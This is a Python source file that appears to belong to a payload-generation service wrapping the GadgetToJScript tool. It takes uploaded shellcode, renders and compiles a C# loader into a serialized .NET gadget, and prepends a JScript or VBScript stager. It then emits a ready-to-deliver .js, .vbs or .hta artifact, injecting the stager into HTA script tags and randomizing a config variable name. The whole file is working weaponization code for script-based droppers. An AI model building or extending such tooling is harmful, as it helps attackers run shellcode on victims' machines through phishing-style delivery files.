import os
import sys
import logging
import uuid
import shutil
import jinja2
from typing import Dict, Any
from .lib.g2js import G2JSRunner
from .lib.stagers import JScriptStager, VBScriptStager

# Configure logging
logger = logging.getLogger("g2js_adapter")

# Mapping frontend options to template variables.
ENCODING_MAP = {
    'base64_encoder': 'base64',
    'base85_encoder': 'base85'
}

COMPRESSION_MAP = {
    'mszip_compressor': 'mszip'
}

G2JS_EXE_PATH = "/app/bin/GadgetToJScript.exe"

def encode(input_filepath: str, original_filename: str, options: Dict[str, Any]) -> str:
    """
    Orchestrates the GadgetToJScript generation pipeline.

    Performs the following steps:
    1. configures the C# loader based on user options.
    2. renders the C# loader template.
    3. compiles the loader into a serialized gadget using G2JS.
    4. generates a stager script that sets up necessary environment variables.
    5. synthesizes the final artifact by combining the stager and the gadget.

    Args:
        input_filepath: Path to the raw shellcode/payload file.
        original_filename: The original name of the uploaded file (used for naming the artifact).
        options: Dictionary of generation options (encoding, compression, debug, etc.).

    Returns:
        The filename of the generated artifact.
    """
    
    script_type = options.get('script_type', 'js')
    
    encoding_opt = options.get('bytecode_encoding', 'base64_encoder')
    compression_opt = options.get('bytecode_compression', '')
    debug_mode = options.get('debug', False)

    # Randomize the configuration variable name
    config_var_name = "G2JS_CFG_" + str(uuid.uuid4()).replace("-", "")[:8].upper()

    template_vars = {
        'encoding': ENCODING_MAP.get(encoding_opt, 'base64'),
        'compression': COMPRESSION_MAP.get(compression_opt, ''),
        'debug': debug_mode,
        'config_var_name': config_var_name
    }
    
    logger.info(f"Starting G2JS adapter for {original_filename}")
    logger.info(f"Options: {template_vars}")

    base_path = os.path.dirname(os.path.abspath(__file__))
    templates_dir = os.path.join(base_path, 'templates')
    
    job_name = os.environ.get("JOB_NAME", str(uuid.uuid4()))
    shared_volume_path = os.path.dirname(input_filepath)
    
    loader_cs_filename = f"{job_name}_Loader.cs"
    loader_cs_path = os.path.join(shared_volume_path, loader_cs_filename)
    
    try:
        env = jinja2.Environment(loader=jinja2.FileSystemLoader(templates_dir))
        template = env.get_template('loader.cs.j2')
        loader_code = template.render(**template_vars)
        
        with open(loader_cs_path, 'w') as f:
            f.write(loader_code)
            
        logger.info(f"Rendered custom loader to {loader_cs_path}")

        with open(input_filepath, 'r') as f:
            payload_string = f.read().strip()
            
        if not payload_string:
            raise ValueError("Input payload is empty.")

        if script_type == 'vbs':
            stager = VBScriptStager()
        elif script_type in ['js', 'hta']:
            stager = JScriptStager()
        else:
            raise ValueError(f"Unsupported script type: {script_type}")
            
        metadata = {}
        if encoding_opt: metadata['ENCODING'] = encoding_opt
        if compression_opt: metadata['COMPRESSION'] = compression_opt
        
        stager_code = stager.generate_code(payload_string, metadata, config_var_name=config_var_name)

        # Run the GadgetToJScript tool to compile the C# loader and serialize it
        temp_output_base = os.path.join(shared_volume_path, f"{job_name}_raw")
        runner = G2JSRunner(G2JS_EXE_PATH, loader_cs_path)
        
        raw_script_content = runner.run(script_type, temp_output_base)
        
        # Combine the environment setup (stager) with the serialized gadget.
        final_content = _synthesize(script_type, stager_code, raw_script_content)
        
        base_name, _ = os.path.splitext(original_filename)
        final_artifact_name = f"{base_name}.{script_type}"
        final_artifact_path = os.path.join(shared_volume_path, final_artifact_name)
        
        with open(final_artifact_path, 'w') as f:
            f.write(final_content)
            
        logger.info(f"G2JS generation successful: {final_artifact_name}")
        
        # Clean up intermediate files to avoid cluttering the shared volume.
        if os.path.exists(loader_cs_path): os.remove(loader_cs_path)
        if os.path.exists(f"{temp_output_base}.{script_type}"): os.remove(f"{temp_output_base}.{script_type}")

        return final_artifact_name

    except Exception as e:
        logger.exception(f"G2JS Adapter failed: {e}")
        if 'loader_cs_path' in locals() and os.path.exists(loader_cs_path): os.remove(loader_cs_path)
        raise

def _synthesize(script_type: str, stager: str, loader: str) -> str:
    """
    Injects the stager code (environment variable setup) into the loader script.

    For simple scripts (JS/VBS), prepending is sufficient.
    For HTA (HTML Applications), the stager must be injected inside valid <script> tags
    to ensure execution before the gadget logic runs.
    """
    if script_type == 'hta':
        import re
        
        # HTA files are HTML. We need to find the correct place to inject our JS stager.
        # Priority 1: Inject into an existing script tag to maintain context.
        script_pattern = re.compile(r'(<script\s+language=["\"](?:javascript|jscript|vbscript)["\"]\s*>)', re.IGNORECASE)
        match = script_pattern.search(loader)
        
        if match:
            tag = match.group(1)
            return loader.replace(tag, f"{tag}\n{stager}")
        
        # Priority 2: Inject after <head> to ensure early execution.
        head_pattern = re.compile(r'(<head\s*>)', re.IGNORECASE)
        match = head_pattern.search(loader)
        if match:
            tag = match.group(1)
            replacement = f'{tag}\n<script language="JScript">\n{stager}\n</script>'
            return loader.replace(tag, replacement)
            
        # Priority 3: Inject after <html> as a fallback.
        html_pattern = re.compile(r'(<html\s*>)', re.IGNORECASE)
        match = html_pattern.search(loader)
        if match:
            tag = match.group(1)
            replacement = f'{tag}\n<script language="JScript">\n{stager}\n</script>'
            return loader.replace(tag, replacement)

        # Fallback: Prepend and wrap in script tags, hoping the parser handles it.
        return f'<script language="JScript">\n{stager}\n</script>\n{loader}'
             
    # For standard scripts, execution order is top-down, so we simply prepend.
    return stager + loader
